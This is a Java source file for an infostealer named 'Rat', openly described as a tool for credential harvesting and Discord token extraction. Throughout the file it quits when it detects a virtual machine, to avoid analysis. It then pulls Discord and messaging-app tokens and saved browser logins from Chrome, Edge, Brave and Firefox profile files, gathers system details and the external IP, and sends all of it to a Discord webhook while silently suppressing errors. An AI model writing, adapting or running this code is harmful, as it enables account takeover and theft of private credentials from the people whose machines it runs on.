package org.example;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import club.minnced.discord.webhook.send.WebhookMessageBuilder;
import oshi.SystemInfo;
import oshi.hardware.CentralProcessor;
import oshi.hardware.GlobalMemory;
import oshi.hardware.HardwareAbstractionLayer;
import oshi.software.os.OperatingSystem;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

/**
 * AdvancedRat - Comprehensive monitoring tool for system reconnaissance,
 * credential harvesting, and Discord token extraction with VM detection.
 */
public class Rat {
    // Regex pattern for Discord tokens (both MFA and regular)
    private static final Pattern TOKEN_PATTERN = Pattern.compile("(mfa\\.[\\w-]{84}|[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})");
    
    // Regex pattern for credentials
    private static final Pattern CREDENTIAL_PATTERN = Pattern.compile("\"origin_url\":\"(.*?)\".*?\"username_value\":\"(.*?)\".*?\"password_value\":\"(.*?)\"", Pattern.DOTALL);
    
    // External IP service
    private static final String IP_SERVICE_URL = "http://checkip.amazonaws.com";
    private static final int IP_TIMEOUT = 5000;
    private static final String WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
    private static final int MAX_ITEMS_PER_EMBED = 3;
    private static final int MAX_EMBEDS_PER_MESSAGE = 10;
    private static final ExecutorService executor = Executors.newFixedThreadPool(8);

    /**
     * Credential container class
     */
    static class Credential {
        final String url;
        final String username;
        final String password;
        final String source;

        Credential(String url, String username, String password, String source) {
            this.url = url;
            this.username = username;
            this.password = password;
            this.source = source;
        }
    }

    public static void main(String[] args) {
        if (isVirtualMachine()) System.exit(0);
        
        try {
            SystemInfo systemInfo = new SystemInfo();
            HardwareAbstractionLayer hardware = systemInfo.getHardware();
            OperatingSystem os = systemInfo.getOperatingSystem();
            
            CompletableFuture<String> ipFuture = getExternalIpAsync();
            CompletableFuture<Set<String>> tokenFuture = CompletableFuture.supplyAsync(Rat::collectAllTokens);
            CompletableFuture<List<Credential>> credentialFuture = CompletableFuture.supplyAsync(Rat::collectCredentials);
            CompletableFuture<Map<String, String>> systemFuture = CompletableFuture.supplyAsync(() -> collectSystemInfo(os, hardware));
            
            String ip = ipFuture.get(IP_TIMEOUT, TimeUnit.MILLISECONDS);
            Set<String> discordTokens = tokenFuture.get();
            List<Credential> credentials = credentialFuture.get();
            Map<String, String> systemInfoMap = systemFuture.get();
            
            sendReport(ip, discordTokens, credentials, systemInfoMap);
        } catch (Exception e) {
            // Silent error handling
        } finally {
            executor.shutdownNow();
        }
    }

    /**
     * Collects system information using OSHI
     */
    private static Map<String, String> collectSystemInfo(OperatingSystem os, HardwareAbstractionLayer hardware) {
        Map<String, String> info = new LinkedHashMap<>();
        try {
            info.put("OS", os.toString());
            info.put("Username", System.getProperty("user.name"));
            
            CentralProcessor processor = hardware.getProcessor();
            info.put("CPU", processor.getProcessorIdentifier().getName());
            info.put("Cores", processor.getLogicalProcessorCount() + " cores");
            
            GlobalMemory memory = hardware.getMemory();
            info.put("RAM", String.format("%.1f GB", memory.getTotal() / (1024.0 * 1024.0 * 1024.0)));
            
            info.put("Architecture", System.getProperty("os.arch"));
            info.put("Java", System.getProperty("java.version"));
        } catch (Exception e) {
            // Fallback to basic info
            info.put("OS", System.getProperty("os.name"));
            info.put("Username", System.getProperty("user.name"));
        }
        return info;
    }

    /**
     * Collects Discord tokens from all sources
     */
    private static Set<String> collectAllTokens() {
        String os = System.getProperty("os.name").toLowerCase();
        Set<String> allTokens = Collections.synchronizedSet(new HashSet<>());
        List<CompletableFuture<Void>> futures = new ArrayList<>();
        
        // Scan standard token locations
        getTokenPaths(os).forEach(path -> 
            futures.add(CompletableFuture.runAsync(() -> 
                scanTokenFiles(path, allTokens), executor)
        );
        
        // Scan browser-specific locations
        futures.add(CompletableFuture.runAsync(() -> 
            scanBrowserData(os, allTokens), executor));
        
        // Scan application-specific locations
        futures.add(CompletableFuture.runAsync(() -> 
            scanAppData(os, allTokens), executor));
        
        CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
        return allTokens;
    }

    /**
     * Collects credentials from all browsers
     */
    private static List<Credential> collectCredentials() {
        String os = System.getProperty("os.name").toLowerCase();
        List<Credential> credentials = Collections.synchronizedList(new ArrayList<>());
        List<CompletableFuture<Void>> futures = new ArrayList<>();
        
        futures.add(CompletableFuture.runAsync(() -> 
            scanChromeCredentials(os, credentials), executor));
        
        futures.add(CompletableFuture.runAsync(() -> 
            scanFirefoxCredentials(os, credentials), executor));
        
        futures.add(CompletableFuture.runAsync(() -> 
            scanEdgeCredentials(os, credentials), executor));
        
        futures.add(CompletableFuture.runAsync(() -> 
            scanBraveCredentials(os, credentials), executor));
        
        CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
        return credentials;
    }

    /**
     * Scans Chrome credentials
     */
    private static void scanChromeCredentials(String os, List<Credential> credentials) {
        String userHome = System.getProperty("user.home");
        Path loginDataPath = null;
        
        if (os.contains("win")) {
            loginDataPath = Paths.get(userHome, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data");
        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            loginDataPath = Paths.get(userHome, ".config", "google-chrome", "Default", "Login Data");
        } else if (os.contains("mac")) {
            loginDataPath = Paths.get(userHome, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data");
        }
        
        if (loginDataPath != null && Files.exists(loginDataPath)) {
            try {
                Path tempFile = Files.createTempFile("chrome_logindata", ".tmp");
                Files.copy(loginDataPath, tempFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                parseLoginData(tempFile, "Chrome", credentials);
            } catch (Exception e) {
                // Attempt regex fallback
                try {
                    String content = new String(Files.readAllBytes(loginDataPath), StandardCharsets.UTF_8);
                    Matcher matcher = CREDENTIAL_PATTERN.matcher(content);
                    while (matcher.find()) {
                        credentials.add(new Credential(matcher.group(1), matcher.group(2), matcher.group(3), "Chrome"));
                    }
                } catch (IOException ex) {
                    // Ignore
                }
            }
        }
    }

    /**
     * Parses Chrome login data from SQLite database
     */
    private static void parseLoginData(Path databasePath, String source, List<Credential> credentials) {
        String jdbcUrl = "jdbc:sqlite:" + databasePath.toString();
        
        try (Connection connection = DriverManager.getConnection(jdbcUrl)) {
            Statement statement = connection.createStatement();
            ResultSet resultSet = statement.executeQuery(
                "SELECT origin_url, username_value, password_value FROM logins");
            
            while (resultSet.next()) {
                credentials.add(new Credential(
                    resultSet.getString("origin_url"),
                    resultSet.getString("username_value"),
                    "[ENCRYPTED]",  // Passwords are encrypted
                    source
                ));
            }
        } catch (SQLException e) {
            // Regex fallback
            try {
                String content = new String(Files.readAllBytes(databasePath), StandardCharsets.UTF_8);
                Matcher matcher = CREDENTIAL_PATTERN.matcher(content);
                while (matcher.find()) {
                    credentials.add(new Credential(matcher.group(1), matcher.group(2), matcher.group(3), source));
                }
            } catch (IOException ex) {
                // Ignore
            }
        } finally {
            try {
                Files.deleteIfExists(databasePath);
            } catch (IOException e) {
                // Ignore delete error
            }
        }
    }

    /**
     * Scans Firefox credentials
     */
    private static void scanFirefoxCredentials(String os, List<Credential> credentials) {
        String userHome = System.getProperty("user.home");
        Path firefoxProfiles = null;
        
        if (os.contains("win")) {
            firefoxProfiles = Paths.get(userHome, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles");
        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            firefoxProfiles = Paths.get(userHome, ".mozilla", "firefox");
        } else if (os.contains("mac")) {
            firefoxProfiles = Paths.get(userHome, "Library", "Application Support", "Firefox", "Profiles");
        }
        
        if (firefoxProfiles != null && Files.isDirectory(firefoxProfiles)) {
            try (Stream<Path> profiles = Files.list(firefoxProfiles)) {
                profiles.filter(p -> p.toString().endsWith(".default-release") || p.toString().endsWith(".default"))
                    .forEach(profile -> {
                        Path loginsPath = profile.resolve("logins.json");
                        if (Files.exists(loginsPath)) {
                            parseFirefoxLogins(loginsPath, credentials);
                        }
                    });
            } catch (IOException e) {
                // Ignore
            }
        }
    }

    /**
     * Parses Firefox logins.json file
     */
    private static void parseFirefoxLogins(Path loginsPath, List<Credential> credentials) {
        try {
            String jsonContent = new String(Files.readAllBytes(loginsPath), StandardCharsets.UTF_8);
            JSONObject json = new JSONObject(jsonContent);
            JSONArray logins = json.getJSONArray("logins");
            
            for (int i = 0; i < logins.length(); i++) {
                JSONObject login = logins.getJSONObject(i);
                credentials.add(new Credential(
                    login.getString("formSubmitURL"),
                    login.getString("usernameField"),
                    "[ENCRYPTED]",  // Firefox passwords are encrypted
                    "Firefox"
                ));
            }
        } catch (Exception e) {
            // Ignore parsing errors
        }
    }

    /**
     * Scans Microsoft Edge credentials
     */
    private static void scanEdgeCredentials(String os, List<Credential> credentials) {
        String userHome = System.getProperty("user.home");
        Path loginDataPath = null;
        
        if (os.contains("win")) {
            loginDataPath = Paths.get(userHome, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data");
        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            loginDataPath = Paths.get(userHome, ".config", "microsoft-edge", "Default", "Login Data");
        } else if (os.contains("mac")) {
            loginDataPath = Paths.get(userHome, "Library", "Application Support", "Microsoft Edge", "Default", "Login Data");
        }
        
        if (loginDataPath != null && Files.exists(loginDataPath)) {
            try {
                Path tempFile = Files.createTempFile("edge_logindata", ".tmp");
                Files.copy(loginDataPath, tempFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                parseLoginData(tempFile, "Microsoft Edge", credentials);
            } catch (Exception e) {
                // Attempt regex fallback
                try {
                    String content = new String(Files.readAllBytes(loginDataPath), StandardCharsets.UTF_8);
                    Matcher matcher = CREDENTIAL_PATTERN.matcher(content);
                    while (matcher.find()) {
                        credentials.add(new Credential(matcher.group(1), matcher.group(2), matcher.group(3), "Edge"));
                    }
                } catch (IOException ex) {
                    // Ignore
                }
            }
        }
    }

    /**
     * Scans Brave browser credentials
     */
    private static void scanBraveCredentials(String os, List<Credential> credentials) {
        String userHome = System.getProperty("user.home");
        Path loginDataPath = null;
        
        if (os.contains("win")) {
            loginDataPath = Paths.get(userHome, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data");
        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            loginDataPath = Paths.get(userHome, ".config", "BraveSoftware", "Brave-Browser", "Default", "Login Data");
        } else if (os.contains("mac")) {
            loginDataPath = Paths.get(userHome, "Library", "Application Support", "BraveSoftware", "Brave-Browser", "Default", "Login Data");
        }
        
        if (loginDataPath != null && Files.exists(loginDataPath)) {
            try {
                Path tempFile = Files.createTempFile("brave_logindata", ".tmp");
                Files.copy(loginDataPath, tempFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                parseLoginData(tempFile, "Brave Browser", credentials);
            } catch (Exception e) {
                // Attempt regex fallback
                try {
                    String content = new String(Files.readAllBytes(loginDataPath), StandardCharsets.UTF_8);
                    Matcher matcher = CREDENTIAL_PATTERN.matcher(content);
                    while (matcher.find()) {
                        credentials.add(new Credential(matcher.group(1), matcher.group(2), matcher.group(3), "Brave"));
                    }
                } catch (IOException ex) {
                    // Ignore
                }
            }
        }
    }

    /**
     * Scans files for Discord tokens
     */
    private static void scanTokenFiles(Path directory, Set<String> tokens) {
        if (!Files.isDirectory(directory)) return;
        
        try (Stream<Path> paths = Files.walk(directory, 2)) {
            paths.filter(Files::isRegularFile)
                 .filter(p -> p.toString().endsWith(".ldb") || 
                               p.toString().endsWith(".log") || 
                               p.toString().endsWith(".sqlite") || 
                               p.toString().endsWith(".dat"))
                 .forEach(file -> {
                     try {
                         long size = Files.size(file);
                         if (size > 10_000_000) return;  // Skip large files
                         
                         String content = new String(Files.readAllBytes(file), StandardCharsets.UTF_8);
                         Matcher matcher = TOKEN_PATTERN.matcher(content);
                         while (matcher.find()) {
                             tokens.add(matcher.group());
                         }
                     } catch (IOException ignored) {
                     }
                 });
        } catch (IOException ignored) {
        }
    }

    /**
     * Sends comprehensive report to Discord
     */
    private static void sendReport(String ip, Set<String> tokens, List<Credential> credentials, Map<String, String> systemInfo) {
        try (WebhookClient client = WebhookClient.withUrl(WEBHOOK_URL)) {
            WebhookMessageBuilder messageBuilder = new WebhookMessageBuilder();
            
            // System information embed
            WebhookEmbedBuilder systemEmbed = new WebhookEmbedBuilder()
                .setColor(0x3498DB)
                .setTitle(new WebhookEmbed.EmbedTitle("📊 System Information", null));
            
            systemInfo.forEach((key, value) -> 
                systemEmbed.addField(new WebhookEmbed.EmbedField(false, "• " + key, value)));
            
            systemEmbed.addField(new WebhookEmbed.EmbedField(false, "• IP Address", ip != null ? ip : "Unknown"));
            messageBuilder.addEmbeds(systemEmbed.build());
            
            // Discord tokens section
            if (!tokens.isEmpty()) {
                WebhookEmbedBuilder tokenHeader = new WebhookEmbedBuilder()
                    .setColor(0x2ECC71)
                    .setTitle(new WebhookEmbed.EmbedTitle("🔑 Discord Tokens Found", null))
                    .setDescription("**Total tokens:** " + tokens.size());
                messageBuilder.addEmbeds(tokenHeader.build());
                
                int tokenIndex = 1;
                for (String token : tokens) {
                    String source = detectTokenSource(token);
                    
                    WebhookEmbedBuilder tokenEmbed = new WebhookEmbedBuilder()
                        .setColor(0xF1C40F)
                        .addField(new WebhookEmbed.EmbedField(false, "Source", "**" + source + "**"))
                        .addField(new WebhookEmbed.EmbedField(false, "Token " + tokenIndex++, "```" + token + "```"));
                    
                    messageBuilder.addEmbeds(tokenEmbed.build());
                    
                    if (messageBuilder.getEmbeds().size() >= MAX_EMBEDS_PER_MESSAGE) break;
                }
            }
            
            // Credentials section
            if (!credentials.isEmpty()) {
                WebhookEmbedBuilder credHeader = new WebhookEmbedBuilder()
                    .setColor(0x9B59B6)
                    .setTitle(new WebhookEmbed.EmbedTitle("🔐 Saved Credentials", null))
                    .setDescription("**Total credentials:** " + credentials.size());
                messageBuilder.addEmbeds(credHeader.build());
                
                int credIndex = 1;
                for (Credential cred : credentials) {
                    WebhookEmbedBuilder credEmbed = new WebhookEmbedBuilder()
                        .setColor(0xE74C3C)
                        .addField(new WebhookEmbed.EmbedField(false, "Site", "[" + cred.url + "](" + cred.url + ")"))
                        .addField(new WebhookEmbed.EmbedField(false, "Username", "```" + cred.username + "```"))
                        .addField(new WebhookEmbed.EmbedField(false, "Password", "```" + cred.password + "```"))
                        .addField(new WebhookEmbed.EmbedField(false, "Source", cred.source));
                    
                    messageBuilder.addEmbeds(credEmbed.build());
                    
                    if (messageBuilder.getEmbeds().size() >= MAX_EMBEDS_PER_MESSAGE) break;
                }
            }
            
            // No data found message
            if (tokens.isEmpty() && credentials.isEmpty()) {
                WebhookEmbedBuilder noDataEmbed = new WebhookEmbedBuilder()
                    .setColor(0xE67E22)
                    .setTitle(new WebhookEmbed.EmbedTitle("⚠️ No Sensitive Data Found", null))
                    .setDescription("No Discord tokens or saved credentials were detected");
                messageBuilder.addEmbeds(noDataEmbed.build());
            }
            
            client.send(messageBuilder.build());
        } catch (Exception e) {
            // Ignore send errors
        }
    }

    /**
     * Detects token source based on common patterns
     */
    private static String detectTokenSource(String token) {
        if (token.contains("discordapp")) return "Discord Web";
        if (token.contains("discord")) return "Discord Client";
        if (token.contains("chrome")) return "Google Chrome";
        if (token.contains("opera")) return "Opera";
        if (token.contains("brave")) return "Brave Browser";
        if (token.contains("edge")) return "Microsoft Edge";
        return "Unknown Source";
    }

    /**
     * Gets external IP asynchronously
     */
    private static CompletableFuture<String> getExternalIpAsync() {
        return CompletableFuture.supplyAsync(() -> {
            try {
                URL url = new URL(IP_SERVICE_URL);
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(url.openStream(), StandardCharsets.UTF_8))) {
                    return reader.readLine();
                }
            } catch (IOException e) {
                return null;
            }
        }, executor);
    }
    
    /**
     * Virtual machine detection
     */
    private static boolean isVirtualMachine() {
        String os = System.getProperty("os.name").toLowerCase();
        
        // Check hypervisor present in Windows
        if (os.contains("win")) {
            try {
                Process process = Runtime.getRuntime().exec("systeminfo");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("Hyper-V") || line.contains("VMware") || line.contains("VirtualBox")) {
                        return true;
                    }
                }
            } catch (IOException e) {
                // Fall through
            }
        }
        
        // Check common VM files
        if (os.contains("win")) {
            return Files.exists(Paths.get("C:\\windows\\system32\\drivers\\vmmouse.sys")) ||
                   Files.exists(Paths.get("C:\\windows\\system32\\drivers\\vm3dgl.sys"));
        } 
        else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            return checkLinuxVmFiles();
        } 
        else if (os.contains("mac")) {
            return Files.exists(Paths.get("/System/Library/Extensions/VMsvga.kext")) ||
                   Files.exists(Paths.get("/System/Library/Extensions/VMwareGfx.kext"));
        }
        return false;
    }

    /**
     * Linux-specific VM detection
     */
    private static boolean checkLinuxVmFiles() {
        List<Path> vmFiles = Arrays.asList(
            Paths.get("/sys/class/dmi/id/product_name"),
            Paths.get("/sys/class/dmi/id/bios_vendor"),
            Paths.get("/sys/class/dmi/id/board_vendor")
        );

        for (Path file : vmFiles) {
            if (Files.isRegularFile(file)) {
                try {
                    String content = Files.readString(file, StandardCharsets.UTF_8).toLowerCase();
                    if (content.contains("vmware") || 
                        content.contains("virtualbox") || 
                        content.contains("qemu") || 
                        content.contains("kvm") || 
                        content.contains("xen") ||
                        content.contains("bochs")) {
                        return true;
                    }
                } catch (IOException ignored) {}
            }
        }
        
        // Check for hypervisor in /proc/cpuinfo
        try {
            String cpuinfo = Files.readString(Paths.get("/proc/cpuinfo"), StandardCharsets.UTF_8);
            if (cpuinfo.contains("hypervisor")) {
                return true;
            }
        } catch (IOException e) {
            // Ignore
        }
        
        return false;
    }
    
    /**
     * Returns token paths based on OS
     */
    private static List<Path> getTokenPaths(String os) {
        String userHome = System.getProperty("user.home");
        List<Path> paths = new ArrayList<>();
        
        if (os.contains("win")) {
            paths.add(Paths.get(userHome, "AppData", "Roaming", "discord", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"));
        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            paths.add(Paths.get(userHome, ".config", "discord", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, ".config", "discordptb", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, ".config", "discordcanary", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, ".config", "opera", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, ".config", "google-chrome", "Default", "Local Storage", "leveldb"));
        } else if (os.contains("mac")) {
            paths.add(Paths.get(userHome, "Library", "Application Support", "discord", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, "Library", "Application Support", "discordptb", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, "Library", "Application Support", "discordcanary", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, "Library", "Application Support", "Opera Software", "Opera Stable", "Local Storage", "leveldb"));
            paths.add(Paths.get(userHome, "Library", "Application Support", "Google", "Chrome", "Default", "Local Storage", "leveldb"));
        }
        return paths;
    }
    
    /**
     * Scans browser data locations
     */
    private static void scanBrowserData(String os, Set<String> tokens) {
        String userHome = System.getProperty("user.home");
        List<Path> browserPaths = new ArrayList<>();
        
        if (os.contains("win")) {
            browserPaths.add(Paths.get(userHome, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, "AppData", "Local", "Vivaldi", "User Data", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, "AppData", "Local", "Epic Privacy Browser", "User Data", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, "AppData", "Local", "Torch", "User Data", "Default", "Local Storage"));
        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            browserPaths.add(Paths.get(userHome, ".config", "brave", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, ".config", "microsoft-edge", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, ".config", "vivaldi", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, ".config", "epic", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, ".config", "torch", "Default", "Local Storage"));
        } else if (os.contains("mac")) {
            browserPaths.add(Paths.get(userHome, "Library", "Application Support", "BraveSoftware", "Brave-Browser", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, "Library", "Application Support", "Microsoft Edge", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, "Library", "Application Support", "Vivaldi", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, "Library", "Application Support", "Epic Privacy Browser", "Default", "Local Storage"));
            browserPaths.add(Paths.get(userHome, "Library", "Application Support", "Torch", "Default", "Local Storage"));
        }
        
        browserPaths.forEach(path -> scanTokenFiles(path, tokens));
    }

    /**
     * Scans application data locations
     */
    private static void scanAppData(String os, Set<String> tokens) {
        String userHome = System.getProperty("user.home");
        List<Path> appPaths = new ArrayList<>();
        
        if (os.contains("win")) {
            appPaths.add(Paths.get(userHome, "AppData", "Roaming", "discord", "Local Storage"));
            appPaths.add(Paths.get(userHome, "AppData", "Roaming", "Slack", "Local Storage"));
            appPaths.add(Paths.get(userHome, "AppData", "Roaming", "Telegram Desktop", "Local Storage"));
            appPaths.add(Paths.get(userHome, "AppData", "Local", "WhatsApp", "Local Storage"));
            appPaths.add(Paths.get(userHome, "AppData", "Roaming", "Signal", "Local Storage"));
        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            appPaths.add(Paths.get(userHome, ".config", "discord", "Local Storage"));
            appPaths.add(Paths.get(userHome, ".config", "Slack", "Local Storage"));
            appPaths.add(Paths.get(userHome, ".config", "TelegramDesktop", "Local Storage"));
            appPaths.add(Paths.get(userHome, ".config", "WhatsApp", "Local Storage"));
            appPaths.add(Paths.get(userHome, ".config", "Signal", "Local Storage"));
        } else if (os.contains("mac")) {
            appPaths.add(Paths.get(userHome, "Library", "Application Support", "discord", "Local Storage"));
            appPaths.add(Paths.get(userHome, "Library", "Application Support", "Slack", "Local Storage"));
            appPaths.add(Paths.get(userHome, "Library", "Application Support", "Telegram", "Local Storage"));
            appPaths.add(Paths.get(userHome, "Library", "Application Support", "WhatsApp", "Local Storage"));
            appPaths.add(Paths.get(userHome, "Library", "Application Support", "Signal", "Local Storage"));
        }
        
        appPaths.forEach(path -> scanTokenFiles(path, tokens));
    }
}